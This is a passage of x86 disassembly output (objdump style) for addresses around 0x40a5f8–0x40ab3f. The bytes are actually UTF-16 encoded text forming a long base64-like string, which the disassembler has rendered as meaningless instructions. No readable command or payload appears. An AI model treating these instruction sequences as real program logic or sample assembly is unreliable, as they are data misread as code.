  40a5f8:	31 00                	xor    %eax,(%eax)
  40a5fa:	78 00                	js     0x40a5fc
  40a5fc:	41                   	inc    %ecx
  40a5fd:	00 56 00             	add    %dl,0x0(%esi)
  40a600:	30 00                	xor    %al,(%eax)
  40a602:	6a 00                	push   $0x0
  40a604:	65 00 7a 00          	add    %bh,%gs:0x0(%edx)
  40a608:	6e                   	outsb  %ds:(%esi),(%dx)
  40a609:	00 69 00             	add    %ch,0x0(%ecx)
  40a60c:	61                   	popa
  40a60d:	00 70 00             	add    %dh,0x0(%eax)
  40a610:	61                   	popa
  40a611:	00 32                	add    %dh,(%edx)
  40a613:	00 74 00 58          	add    %dh,0x58(%eax,%eax,1)
  40a617:	00 35 00 73 00 30    	add    %dh,0x30007300
  40a61d:	00 67 00             	add    %ah,0x0(%edi)
  40a620:	63 00                	arpl   %eax,(%eax)
  40a622:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40a626:	76 00                	jbe    0x40a628
  40a628:	44                   	inc    %esp
  40a629:	00 2b                	add    %ch,(%ebx)
  40a62b:	00 62 00             	add    %ah,0x0(%edx)
  40a62e:	65 00 34 00          	add    %dh,%gs:(%eax,%eax,1)
  40a632:	66 00 4b 00          	data16 add %cl,0x0(%ebx)
  40a636:	31 00                	xor    %eax,(%eax)
  40a638:	56                   	push   %esi
  40a639:	00 6d 00             	add    %ch,0x0(%ebp)
  40a63c:	46                   	inc    %esi
  40a63d:	00 46 00             	add    %al,0x0(%esi)
  40a640:	78 00                	js     0x40a642
  40a642:	7a 00                	jp     0x40a644
  40a644:	70 00                	jo     0x40a646
  40a646:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
  40a64a:	6b 00 33             	imul   $0x33,(%eax),%eax
  40a64d:	00 70 00             	add    %dh,0x0(%eax)
  40a650:	38 00                	cmp    %al,(%eax)
  40a652:	37                   	aaa
  40a653:	00 75 00             	add    %dh,0x0(%ebp)
  40a656:	58                   	pop    %eax
  40a657:	00 4d 00             	add    %cl,0x0(%ebp)
  40a65a:	47                   	inc    %edi
  40a65b:	00 70 00             	add    %dh,0x0(%eax)
  40a65e:	46                   	inc    %esi
  40a65f:	00 64 00 4d          	add    %ah,0x4d(%eax,%eax,1)
  40a663:	00 6f 00             	add    %ch,0x0(%edi)
  40a666:	70 00                	jo     0x40a668
  40a668:	77 00                	ja     0x40a66a
  40a66a:	68 00 2b 00 69       	push   $0x69002b00
  40a66f:	00 4f 00             	add    %cl,0x0(%edi)
  40a672:	4c                   	dec    %esp
  40a673:	00 37                	add    %dh,(%edi)
  40a675:	00 72 00             	add    %dh,0x0(%edx)
  40a678:	5a                   	pop    %edx
  40a679:	00 4b 00             	add    %cl,0x0(%ebx)
  40a67c:	2f                   	das
  40a67d:	00 47 00             	add    %al,0x0(%edi)
  40a680:	35 00 4a 00 6e       	xor    $0x6e004a00,%eax
  40a685:	00 5a 00             	add    %bl,0x0(%edx)
  40a688:	32 00                	xor    (%eax),%al
  40a68a:	31 00                	xor    %eax,(%eax)
  40a68c:	67 00 66 00          	add    %ah,0x0(%bp)
  40a690:	49                   	dec    %ecx
  40a691:	00 70 00             	add    %dh,0x0(%eax)
  40a694:	67 00 36 00 69       	add    %dh,0x6900
  40a699:	00 5a 00             	add    %bl,0x0(%edx)
  40a69c:	55                   	push   %ebp
  40a69d:	00 2b                	add    %ch,(%ebx)
  40a69f:	00 6c 00 55          	add    %ch,0x55(%eax,%eax,1)
  40a6a3:	00 55 00             	add    %dl,0x0(%ebp)
  40a6a6:	73 00                	jae    0x40a6a8
  40a6a8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6a9:	00 51 00             	add    %dl,0x0(%ecx)
  40a6ac:	4a                   	dec    %edx
  40a6ad:	00 6d 00             	add    %ch,0x0(%ebp)
  40a6b0:	64 00 53 00          	add    %dl,%fs:0x0(%ebx)
  40a6b4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a6b5:	00 6f 00             	add    %ch,0x0(%edi)
  40a6b8:	5a                   	pop    %edx
  40a6b9:	00 4a 00             	add    %cl,0x0(%edx)
  40a6bc:	32 00                	xor    (%eax),%al
  40a6be:	58                   	pop    %eax
  40a6bf:	00 39                	add    %bh,(%ecx)
  40a6c1:	00 58 00             	add    %bl,0x0(%eax)
  40a6c4:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
  40a6c8:	42                   	inc    %edx
  40a6c9:	00 45 00             	add    %al,0x0(%ebp)
  40a6cc:	48                   	dec    %eax
  40a6cd:	00 64 00 4d          	add    %ah,0x4d(%eax,%eax,1)
  40a6d1:	00 42 00             	add    %al,0x0(%edx)
  40a6d4:	33 00                	xor    (%eax),%eax
  40a6d6:	46                   	inc    %esi
  40a6d7:	00 76 00             	add    %dh,0x0(%esi)
  40a6da:	55                   	push   %ebp
  40a6db:	00 46 00             	add    %al,0x0(%esi)
  40a6de:	72 00                	jb     0x40a6e0
  40a6e0:	75 00                	jne    0x40a6e2
  40a6e2:	45                   	inc    %ebp
  40a6e3:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
  40a6e7:	00 5a 00             	add    %bl,0x0(%edx)
  40a6ea:	44                   	inc    %esp
  40a6eb:	00 6e 00             	add    %ch,0x0(%esi)
  40a6ee:	58                   	pop    %eax
  40a6ef:	00 77 00             	add    %dh,0x0(%edi)
  40a6f2:	4b                   	dec    %ebx
  40a6f3:	00 6f 00             	add    %ch,0x0(%edi)
  40a6f6:	36 00 6d 00          	add    %ch,%ss:0x0(%ebp)
  40a6fa:	6b 00 66             	imul   $0x66,(%eax),%eax
  40a6fd:	00 42 00             	add    %al,0x0(%edx)
  40a700:	62 00                	bound  %eax,(%eax)
  40a702:	77 00                	ja     0x40a704
  40a704:	2f                   	das
  40a705:	00 47 00             	add    %al,0x0(%edi)
  40a708:	30 00                	xor    %al,(%eax)
  40a70a:	77 00                	ja     0x40a70c
  40a70c:	32 00                	xor    (%eax),%al
  40a70e:	33 00                	xor    (%eax),%eax
  40a710:	37                   	aaa
  40a711:	00 30                	add    %dh,(%eax)
  40a713:	00 63 00             	add    %ah,0x0(%ebx)
  40a716:	76 00                	jbe    0x40a718
  40a718:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a71c:	63 00                	arpl   %eax,(%eax)
  40a71e:	73 00                	jae    0x40a720
  40a720:	70 00                	jo     0x40a722
  40a722:	59                   	pop    %ecx
  40a723:	00 31                	add    %dh,(%ecx)
  40a725:	00 57 00             	add    %dl,0x0(%edi)
  40a728:	7a 00                	jp     0x40a72a
  40a72a:	78 00                	js     0x40a72c
  40a72c:	6a 00                	push   $0x0
  40a72e:	4a                   	dec    %edx
  40a72f:	00 6f 00             	add    %ch,0x0(%edi)
  40a732:	69 00 45 00 33 00    	imul   $0x330045,(%eax),%eax
  40a738:	5a                   	pop    %edx
  40a739:	00 51 00             	add    %dl,0x0(%ecx)
  40a73c:	70 00                	jo     0x40a73e
  40a73e:	33 00                	xor    (%eax),%eax
  40a740:	30 00                	xor    %al,(%eax)
  40a742:	77 00                	ja     0x40a744
  40a744:	4f                   	dec    %edi
  40a745:	00 6b 00             	add    %ch,0x0(%ebx)
  40a748:	74 00                	je     0x40a74a
  40a74a:	52                   	push   %edx
  40a74b:	00 74 00 34          	add    %dh,0x34(%eax,%eax,1)
  40a74f:	00 6f 00             	add    %ch,0x0(%edi)
  40a752:	76 00                	jbe    0x40a754
  40a754:	59                   	pop    %ecx
  40a755:	00 42 00             	add    %al,0x0(%edx)
  40a758:	55                   	push   %ebp
  40a759:	00 6e 00             	add    %ch,0x0(%esi)
  40a75c:	63 00                	arpl   %eax,(%eax)
  40a75e:	4b                   	dec    %ebx
  40a75f:	00 72 00             	add    %dh,0x0(%edx)
  40a762:	62 00                	bound  %eax,(%eax)
  40a764:	6b 00 32             	imul   $0x32,(%eax),%eax
  40a767:	00 55 00             	add    %dl,0x0(%ebp)
  40a76a:	4a                   	dec    %edx
  40a76b:	00 44 00 78          	add    %al,0x78(%eax,%eax,1)
  40a76f:	00 36                	add    %dh,(%esi)
  40a771:	00 56 00             	add    %dl,0x0(%esi)
  40a774:	68 00 39 00 39       	push   $0x39003900
  40a779:	00 32                	add    %dh,(%edx)
  40a77b:	00 31                	add    %dh,(%ecx)
  40a77d:	00 58 00             	add    %bl,0x0(%eax)
  40a780:	51                   	push   %ecx
  40a781:	00 51 00             	add    %dl,0x0(%ecx)
  40a784:	4b                   	dec    %ebx
  40a785:	00 4b 00             	add    %cl,0x0(%ebx)
  40a788:	2b 00                	sub    (%eax),%eax
  40a78a:	66 00 6e 00          	data16 add %ch,0x0(%esi)
  40a78e:	78 00                	js     0x40a790
  40a790:	33 00                	xor    (%eax),%eax
  40a792:	4d                   	dec    %ebp
  40a793:	00 69 00             	add    %ch,0x0(%ecx)
  40a796:	72 00                	jb     0x40a798
  40a798:	53                   	push   %ebx
  40a799:	00 74 00 36          	add    %dh,0x36(%eax,%eax,1)
  40a79d:	00 41 00             	add    %al,0x0(%ecx)
  40a7a0:	43                   	inc    %ebx
  40a7a1:	00 79 00             	add    %bh,0x0(%ecx)
  40a7a4:	30 00                	xor    %al,(%eax)
  40a7a6:	7a 00                	jp     0x40a7a8
  40a7a8:	38 00                	cmp    %al,(%eax)
  40a7aa:	35 00 79 00 4d       	xor    $0x4d007900,%eax
  40a7af:	00 2b                	add    %ch,(%ebx)
  40a7b1:	00 50 00             	add    %dl,0x0(%eax)
  40a7b4:	4b                   	dec    %ebx
  40a7b5:	00 4d 00             	add    %cl,0x0(%ebp)
  40a7b8:	34 00                	xor    $0x0,%al
  40a7ba:	6e                   	outsb  %ds:(%esi),(%dx)
  40a7bb:	00 33                	add    %dh,(%ebx)
  40a7bd:	00 4c 00 58          	add    %cl,0x58(%eax,%eax,1)
  40a7c1:	00 67 00             	add    %ah,0x0(%edi)
  40a7c4:	57                   	push   %edi
  40a7c5:	00 31                	add    %dh,(%ecx)
  40a7c7:	00 4c 00 47          	add    %cl,0x47(%eax,%eax,1)
  40a7cb:	00 31                	add    %dh,(%ecx)
  40a7cd:	00 7a 00             	add    %bh,0x0(%edx)
  40a7d0:	53                   	push   %ebx
  40a7d1:	00 4a 00             	add    %cl,0x0(%edx)
  40a7d4:	52                   	push   %edx
  40a7d5:	00 6b 00             	add    %ch,0x0(%ebx)
  40a7d8:	35 00 4b 00 35       	xor    $0x35004b00,%eax
  40a7dd:	00 52 00             	add    %dl,0x0(%edx)
  40a7e0:	78 00                	js     0x40a7e2
  40a7e2:	41                   	inc    %ecx
  40a7e3:	00 36                	add    %dh,(%esi)
  40a7e5:	00 52 00             	add    %dl,0x0(%edx)
  40a7e8:	52                   	push   %edx
  40a7e9:	00 35 00 71 00 33    	add    %dh,0x33007100
  40a7ef:	00 43 00             	add    %al,0x0(%ebx)
  40a7f2:	52                   	push   %edx
  40a7f3:	00 57 00             	add    %dl,0x0(%edi)
  40a7f6:	2b 00                	sub    (%eax),%eax
  40a7f8:	52                   	push   %edx
  40a7f9:	00 79 00             	add    %bh,0x0(%ecx)
  40a7fc:	63 00                	arpl   %eax,(%eax)
  40a7fe:	71 00                	jno    0x40a800
  40a800:	31 00                	xor    %eax,(%eax)
  40a802:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
  40a806:	75 00                	jne    0x40a808
  40a808:	68 00 4d 00 79       	push   $0x79004d00
  40a80d:	00 4d 00             	add    %cl,0x0(%ebp)
  40a810:	70 00                	jo     0x40a812
  40a812:	39 00                	cmp    %eax,(%eax)
  40a814:	6d                   	insl   (%dx),%es:(%edi)
  40a815:	00 75 00             	add    %dh,0x0(%ebp)
  40a818:	57                   	push   %edi
  40a819:	00 4a 00             	add    %cl,0x0(%edx)
  40a81c:	68 00 33 00 44       	push   $0x44003300
  40a821:	00 4a 00             	add    %cl,0x0(%edx)
  40a824:	67 00 4d 00          	add    %cl,0x0(%di)
  40a828:	47                   	inc    %edi
  40a829:	00 42 00             	add    %al,0x0(%edx)
  40a82c:	78 00                	js     0x40a82e
  40a82e:	79 00                	jns    0x40a830
  40a830:	68 00 47 00 77       	push   $0x77004700
  40a835:	00 37                	add    %dh,(%edi)
  40a837:	00 48 00             	add    %cl,0x0(%eax)
  40a83a:	6d                   	insl   (%dx),%es:(%edi)
  40a83b:	00 58 00             	add    %bl,0x0(%eax)
  40a83e:	39 00                	cmp    %eax,(%eax)
  40a840:	68 00 56 00 54       	push   $0x54005600
  40a845:	00 75 00             	add    %dh,0x0(%ebp)
  40a848:	49                   	dec    %ecx
  40a849:	00 36                	add    %dh,(%esi)
  40a84b:	00 47 00             	add    %al,0x0(%edi)
  40a84e:	34 00                	xor    $0x0,%al
  40a850:	4c                   	dec    %esp
  40a851:	00 76 00             	add    %dh,0x0(%esi)
  40a854:	53                   	push   %ebx
  40a855:	00 62 00             	add    %ah,0x0(%edx)
  40a858:	33 00                	xor    (%eax),%eax
  40a85a:	58                   	pop    %eax
  40a85b:	00 54 00 49          	add    %dl,0x49(%eax,%eax,1)
  40a85f:	00 47 00             	add    %al,0x0(%edi)
  40a862:	47                   	inc    %edi
  40a863:	00 4d 00             	add    %cl,0x0(%ebp)
  40a866:	4a                   	dec    %edx
  40a867:	00 71 00             	add    %dh,0x0(%ecx)
  40a86a:	49                   	dec    %ecx
  40a86b:	00 43 00             	add    %al,0x0(%ebx)
  40a86e:	74 00                	je     0x40a870
  40a870:	4e                   	dec    %esi
  40a871:	00 39                	add    %bh,(%ecx)
  40a873:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
  40a877:	00 69 00             	add    %ch,0x0(%ecx)
  40a87a:	70 00                	jo     0x40a87c
  40a87c:	4a                   	dec    %edx
  40a87d:	00 39                	add    %bh,(%ecx)
  40a87f:	00 78 00             	add    %bh,0x0(%eax)
  40a882:	6c                   	insb   (%dx),%es:(%edi)
  40a883:	00 67 00             	add    %ah,0x0(%edi)
  40a886:	62 00                	bound  %eax,(%eax)
  40a888:	2b 00                	sub    (%eax),%eax
  40a88a:	4f                   	dec    %edi
  40a88b:	00 37                	add    %dh,(%edi)
  40a88d:	00 31                	add    %dh,(%ecx)
  40a88f:	00 69 00             	add    %ch,0x0(%ecx)
  40a892:	4c                   	dec    %esp
  40a893:	00 4a 00             	add    %cl,0x0(%edx)
  40a896:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40a89a:	33 00                	xor    (%eax),%eax
  40a89c:	48                   	dec    %eax
  40a89d:	00 4e 00             	add    %cl,0x0(%esi)
  40a8a0:	41                   	inc    %ecx
  40a8a1:	00 4f 00             	add    %cl,0x0(%edi)
  40a8a4:	59                   	pop    %ecx
  40a8a5:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a8a8:	58                   	pop    %eax
  40a8a9:	00 38                	add    %bh,(%eax)
  40a8ab:	00 49 00             	add    %cl,0x0(%ecx)
  40a8ae:	64 00 67 00          	add    %ah,%fs:0x0(%edi)
  40a8b2:	68 00 5a 00 4f       	push   $0x4f005a00
  40a8b7:	00 4d 00             	add    %cl,0x0(%ebp)
  40a8ba:	32 00                	xor    (%eax),%al
  40a8bc:	53                   	push   %ebx
  40a8bd:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a8c0:	53                   	push   %ebx
  40a8c1:	00 38                	add    %bh,(%eax)
  40a8c3:	00 32                	add    %dh,(%edx)
  40a8c5:	00 53 00             	add    %dl,0x0(%ebx)
  40a8c8:	71 00                	jno    0x40a8ca
  40a8ca:	55                   	push   %ebp
  40a8cb:	00 6b 00             	add    %ch,0x0(%ebx)
  40a8ce:	4e                   	dec    %esi
  40a8cf:	00 51 00             	add    %dl,0x0(%ecx)
  40a8d2:	42                   	inc    %edx
  40a8d3:	00 4d 00             	add    %cl,0x0(%ebp)
  40a8d6:	4c                   	dec    %esp
  40a8d7:	00 55 00             	add    %dl,0x0(%ebp)
  40a8da:	6e                   	outsb  %ds:(%esi),(%dx)
  40a8db:	00 6a 00             	add    %ch,0x0(%edx)
  40a8de:	4b                   	dec    %ebx
  40a8df:	00 54 00 6f          	add    %dl,0x6f(%eax,%eax,1)
  40a8e3:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a8e6:	45                   	inc    %ebp
  40a8e7:	00 30                	add    %dh,(%eax)
  40a8e9:	00 57 00             	add    %dl,0x0(%edi)
  40a8ec:	33 00                	xor    (%eax),%eax
  40a8ee:	6c                   	insb   (%dx),%es:(%edi)
  40a8ef:	00 55 00             	add    %dl,0x0(%ebp)
  40a8f2:	35 00 69 00 30       	xor    $0x30006900,%eax
  40a8f7:	00 35 00 4b 00 50    	add    %dh,0x50004b00
  40a8fd:	00 67 00             	add    %ah,0x0(%edi)
  40a900:	70 00                	jo     0x40a902
  40a902:	6f                   	outsl  %ds:(%esi),(%dx)
  40a903:	00 53 00             	add    %dl,0x0(%ebx)
  40a906:	6a 00                	push   $0x0
  40a908:	4c                   	dec    %esp
  40a909:	00 66 00             	add    %ah,0x0(%esi)
  40a90c:	44                   	inc    %esp
  40a90d:	00 33                	add    %dh,(%ebx)
  40a90f:	00 63 00             	add    %ah,0x0(%ebx)
  40a912:	55                   	push   %ebp
  40a913:	00 36                	add    %dh,(%esi)
  40a915:	00 33                	add    %dh,(%ebx)
  40a917:	00 70 00             	add    %dh,0x0(%eax)
  40a91a:	2b 00                	sub    (%eax),%eax
  40a91c:	66 00 53 00          	data16 add %dl,0x0(%ebx)
  40a920:	36 00 47 00          	add    %al,%ss:0x0(%edi)
  40a924:	4d                   	dec    %ebp
  40a925:	00 56 00             	add    %dl,0x0(%esi)
  40a928:	56                   	push   %esi
  40a929:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  40a92d:	00 78 00             	add    %bh,0x0(%eax)
  40a930:	4b                   	dec    %ebx
  40a931:	00 4e 00             	add    %cl,0x0(%esi)
  40a934:	52                   	push   %edx
  40a935:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a938:	4d                   	dec    %ebp
  40a939:	00 36                	add    %dh,(%esi)
  40a93b:	00 61 00             	add    %ah,0x0(%ecx)
  40a93e:	48                   	dec    %eax
  40a93f:	00 33                	add    %dh,(%ebx)
  40a941:	00 48 00             	add    %cl,0x0(%eax)
  40a944:	51                   	push   %ecx
  40a945:	00 67 00             	add    %ah,0x0(%edi)
  40a948:	6e                   	outsb  %ds:(%esi),(%dx)
  40a949:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  40a94d:	00 2b                	add    %ch,(%ebx)
  40a94f:	00 6d 00             	add    %ch,0x0(%ebp)
  40a952:	4e                   	dec    %esi
  40a953:	00 48 00             	add    %cl,0x0(%eax)
  40a956:	42                   	inc    %edx
  40a957:	00 68 00             	add    %ch,0x0(%eax)
  40a95a:	57                   	push   %edi
  40a95b:	00 59 00             	add    %bl,0x0(%ecx)
  40a95e:	4f                   	dec    %edi
  40a95f:	00 32                	add    %dh,(%edx)
  40a961:	00 63 00             	add    %ah,0x0(%ebx)
  40a964:	50                   	push   %eax
  40a965:	00 7a 00             	add    %bh,0x0(%edx)
  40a968:	4a                   	dec    %edx
  40a969:	00 51 00             	add    %dl,0x0(%ecx)
  40a96c:	61                   	popa
  40a96d:	00 41 00             	add    %al,0x0(%ecx)
  40a970:	78 00                	js     0x40a972
  40a972:	55                   	push   %ebp
  40a973:	00 39                	add    %bh,(%ecx)
  40a975:	00 76 00             	add    %dh,0x0(%esi)
  40a978:	73 00                	jae    0x40a97a
  40a97a:	31 00                	xor    %eax,(%eax)
  40a97c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a97d:	00 52 00             	add    %dl,0x0(%edx)
  40a980:	34 00                	xor    $0x0,%al
  40a982:	30 00                	xor    %al,(%eax)
  40a984:	4a                   	dec    %edx
  40a985:	00 76 00             	add    %dh,0x0(%esi)
  40a988:	32 00                	xor    (%eax),%al
  40a98a:	69 00 38 00 75 00    	imul   $0x750038,(%eax),%eax
  40a990:	45                   	inc    %ebp
  40a991:	00 4d 00             	add    %cl,0x0(%ebp)
  40a994:	4c                   	dec    %esp
  40a995:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
  40a999:	00 6d 00             	add    %ch,0x0(%ebp)
  40a99c:	43                   	inc    %ebx
  40a99d:	00 63 00             	add    %ah,0x0(%ebx)
  40a9a0:	2b 00                	sub    (%eax),%eax
  40a9a2:	39 00                	cmp    %eax,(%eax)
  40a9a4:	55                   	push   %ebp
  40a9a5:	00 70 00             	add    %dh,0x0(%eax)
  40a9a8:	57                   	push   %edi
  40a9a9:	00 59 00             	add    %bl,0x0(%ecx)
  40a9ac:	6b 00 59             	imul   $0x59,(%eax),%eax
  40a9af:	00 79 00             	add    %bh,0x0(%ecx)
  40a9b2:	36 00 48 00          	add    %cl,%ss:0x0(%eax)
  40a9b6:	41                   	inc    %ecx
  40a9b7:	00 6d 00             	add    %ch,0x0(%ebp)
  40a9ba:	53                   	push   %ebx
  40a9bb:	00 4b 00             	add    %cl,0x0(%ebx)
  40a9be:	58                   	pop    %eax
  40a9bf:	00 2f                	add    %ch,(%edi)
  40a9c1:	00 50 00             	add    %dl,0x0(%eax)
  40a9c4:	33 00                	xor    (%eax),%eax
  40a9c6:	4c                   	dec    %esp
  40a9c7:	00 31                	add    %dh,(%ecx)
  40a9c9:	00 4a 00             	add    %cl,0x0(%edx)
  40a9cc:	39 00                	cmp    %eax,(%eax)
  40a9ce:	69 00 57 00 69 00    	imul   $0x690057,(%eax),%eax
  40a9d4:	2f                   	das
  40a9d5:	00 4e 00             	add    %cl,0x0(%esi)
  40a9d8:	78 00                	js     0x40a9da
  40a9da:	34 00                	xor    $0x0,%al
  40a9dc:	32 00                	xor    (%eax),%al
  40a9de:	75 00                	jne    0x40a9e0
  40a9e0:	61                   	popa
  40a9e1:	00 58 00             	add    %bl,0x0(%eax)
  40a9e4:	4e                   	dec    %esi
  40a9e5:	00 37                	add    %dh,(%edi)
  40a9e7:	00 61 00             	add    %ah,0x0(%ecx)
  40a9ea:	31 00                	xor    %eax,(%eax)
  40a9ec:	34 00                	xor    $0x0,%al
  40a9ee:	32 00                	xor    (%eax),%al
  40a9f0:	30 00                	xor    %al,(%eax)
  40a9f2:	58                   	pop    %eax
  40a9f3:	00 45 00             	add    %al,0x0(%ebp)
  40a9f6:	75 00                	jne    0x40a9f8
  40a9f8:	44                   	inc    %esp
  40a9f9:	00 5a 00             	add    %bl,0x0(%edx)
  40a9fc:	4a                   	dec    %edx
  40a9fd:	00 31                	add    %dh,(%ecx)
  40a9ff:	00 62 00             	add    %ah,0x0(%edx)
  40aa02:	48                   	dec    %eax
  40aa03:	00 66 00             	add    %ah,0x0(%esi)
  40aa06:	49                   	dec    %ecx
  40aa07:	00 4e 00             	add    %cl,0x0(%esi)
  40aa0a:	59                   	pop    %ecx
  40aa0b:	00 2f                	add    %ch,(%edi)
  40aa0d:	00 6e 00             	add    %ch,0x0(%esi)
  40aa10:	67 00 54 00          	add    %dl,0x0(%si)
  40aa14:	6a 00                	push   $0x0
  40aa16:	77 00                	ja     0x40aa18
  40aa18:	6b 00 7a             	imul   $0x7a,(%eax),%eax
  40aa1b:	00 51 00             	add    %dl,0x0(%ecx)
  40aa1e:	73 00                	jae    0x40aa20
  40aa20:	4c                   	dec    %esp
  40aa21:	00 31                	add    %dh,(%ecx)
  40aa23:	00 52 00             	add    %dl,0x0(%edx)
  40aa26:	4d                   	dec    %ebp
  40aa27:	00 56 00             	add    %dl,0x0(%esi)
  40aa2a:	42                   	inc    %edx
  40aa2b:	00 6f 00             	add    %ch,0x0(%edi)
  40aa2e:	6d                   	insl   (%dx),%es:(%edi)
  40aa2f:	00 59 00             	add    %bl,0x0(%ecx)
  40aa32:	72 00                	jb     0x40aa34
  40aa34:	6c                   	insb   (%dx),%es:(%edi)
  40aa35:	00 2f                	add    %ch,(%edi)
  40aa37:	00 65 00             	add    %ah,0x0(%ebp)
  40aa3a:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40aa3e:	43                   	inc    %ebx
  40aa3f:	00 42 00             	add    %al,0x0(%edx)
  40aa42:	55                   	push   %ebp
  40aa43:	00 67 00             	add    %ah,0x0(%edi)
  40aa46:	58                   	pop    %eax
  40aa47:	00 55 00             	add    %dl,0x0(%ebp)
  40aa4a:	4b                   	dec    %ebx
  40aa4b:	00 4f 00             	add    %cl,0x0(%edi)
  40aa4e:	71 00                	jno    0x40aa50
  40aa50:	2b 00                	sub    (%eax),%eax
  40aa52:	50                   	push   %eax
  40aa53:	00 70 00             	add    %dh,0x0(%eax)
  40aa56:	68 00 44 00 49       	push   $0x49004400
  40aa5b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aa5e:	66 00 4d 00          	data16 add %cl,0x0(%ebp)
  40aa62:	48                   	dec    %eax
  40aa63:	00 32                	add    %dh,(%edx)
  40aa65:	00 45 00             	add    %al,0x0(%ebp)
  40aa68:	45                   	inc    %ebp
  40aa69:	00 64 00 39          	add    %ah,0x39(%eax,%eax,1)
  40aa6d:	00 30                	add    %dh,(%eax)
  40aa6f:	00 49 00             	add    %cl,0x0(%ecx)
  40aa72:	4d                   	dec    %ebp
  40aa73:	00 7a 00             	add    %bh,0x0(%edx)
  40aa76:	48                   	dec    %eax
  40aa77:	00 44 00 47          	add    %al,0x47(%eax,%eax,1)
  40aa7b:	00 38                	add    %bh,(%eax)
  40aa7d:	00 53 00             	add    %dl,0x0(%ebx)
  40aa80:	74 00                	je     0x40aa82
  40aa82:	75 00                	jne    0x40aa84
  40aa84:	36 00 6c 00 45       	add    %ch,%ss:0x45(%eax,%eax,1)
  40aa89:	00 4c 00 39          	add    %cl,0x39(%eax,%eax,1)
  40aa8d:	00 4b 00             	add    %cl,0x0(%ebx)
  40aa90:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa91:	00 57 00             	add    %dl,0x0(%edi)
  40aa94:	74 00                	je     0x40aa96
  40aa96:	51                   	push   %ecx
  40aa97:	00 42 00             	add    %al,0x0(%edx)
  40aa9a:	66 00 79 00          	data16 add %bh,0x0(%ecx)
  40aa9e:	47                   	inc    %edi
  40aa9f:	00 74 00 30          	add    %dh,0x30(%eax,%eax,1)
  40aaa3:	00 56 00             	add    %dl,0x0(%esi)
  40aaa6:	6b 00 33             	imul   $0x33,(%eax),%eax
  40aaa9:	00 31                	add    %dh,(%ecx)
  40aaab:	00 32                	add    %dh,(%edx)
  40aaad:	00 53 00             	add    %dl,0x0(%ebx)
  40aab0:	4c                   	dec    %esp
  40aab1:	00 54 00 4b          	add    %dl,0x4b(%eax,%eax,1)
  40aab5:	00 7a 00             	add    %bh,0x0(%edx)
  40aab8:	62 00                	bound  %eax,(%eax)
  40aaba:	54                   	push   %esp
  40aabb:	00 30                	add    %dh,(%eax)
  40aabd:	00 72 00             	add    %dh,0x0(%edx)
  40aac0:	41                   	inc    %ecx
  40aac1:	00 73 00             	add    %dh,0x0(%ebx)
  40aac4:	69 00 62 00 4f 00    	imul   $0x4f0062,(%eax),%eax
  40aaca:	44                   	inc    %esp
  40aacb:	00 70 00             	add    %dh,0x0(%eax)
  40aace:	57                   	push   %edi
  40aacf:	00 47 00             	add    %al,0x0(%edi)
  40aad2:	31 00                	xor    %eax,(%eax)
  40aad4:	42                   	inc    %edx
  40aad5:	00 31                	add    %dh,(%ecx)
  40aad7:	00 42 00             	add    %al,0x0(%edx)
  40aada:	4e                   	dec    %esi
  40aadb:	00 44 00 35          	add    %al,0x35(%eax,%eax,1)
  40aadf:	00 6a 00             	add    %ch,0x0(%edx)
  40aae2:	6f                   	outsl  %ds:(%esi),(%dx)
  40aae3:	00 44 00 5a          	add    %al,0x5a(%eax,%eax,1)
  40aae7:	00 65 00             	add    %ah,0x0(%ebp)
  40aaea:	6d                   	insl   (%dx),%es:(%edi)
  40aaeb:	00 64 00 41          	add    %ah,0x41(%eax,%eax,1)
  40aaef:	00 4f 00             	add    %cl,0x0(%edi)
  40aaf2:	45                   	inc    %ebp
  40aaf3:	00 5a 00             	add    %bl,0x0(%edx)
  40aaf6:	76 00                	jbe    0x40aaf8
  40aaf8:	50                   	push   %eax
  40aaf9:	00 64 00 52          	add    %ah,0x52(%eax,%eax,1)
  40aafd:	00 42 00             	add    %al,0x0(%edx)
  40ab00:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab01:	00 70 00             	add    %dh,0x0(%eax)
  40ab04:	56                   	push   %esi
  40ab05:	00 4b 00             	add    %cl,0x0(%ebx)
  40ab08:	4b                   	dec    %ebx
  40ab09:	00 48 00             	add    %cl,0x0(%eax)
  40ab0c:	36 00 66 00          	add    %ah,%ss:0x0(%esi)
  40ab10:	2f                   	das
  40ab11:	00 36                	add    %dh,(%esi)
  40ab13:	00 69 00             	add    %ch,0x0(%ecx)
  40ab16:	4f                   	dec    %edi
  40ab17:	00 61 00             	add    %ah,0x0(%ecx)
  40ab1a:	4e                   	dec    %esi
  40ab1b:	00 76 00             	add    %dh,0x0(%esi)
  40ab1e:	4a                   	dec    %edx
  40ab1f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ab22:	47                   	inc    %edi
  40ab23:	00 37                	add    %dh,(%edi)
  40ab25:	00 79 00             	add    %bh,0x0(%ecx)
  40ab28:	36 00 6f 00          	add    %ch,%ss:0x0(%edi)
  40ab2c:	61                   	popa
  40ab2d:	00 76 00             	add    %dh,0x0(%esi)
  40ab30:	58                   	pop    %eax
  40ab31:	00 32                	add    %dh,(%edx)
  40ab33:	00 76 00             	add    %dh,0x0(%esi)
  40ab36:	58                   	pop    %eax
  40ab37:	00 42 00             	add    %al,0x0(%edx)
  40ab3a:	31 00                	xor    %eax,(%eax)
  40ab3c:	59                   	pop    %ecx
  40ab3d:	00 39                	add    %bh,(%ecx)
  40ab3f:	00 6d 00             	add    %ch,0x0(%ebp)
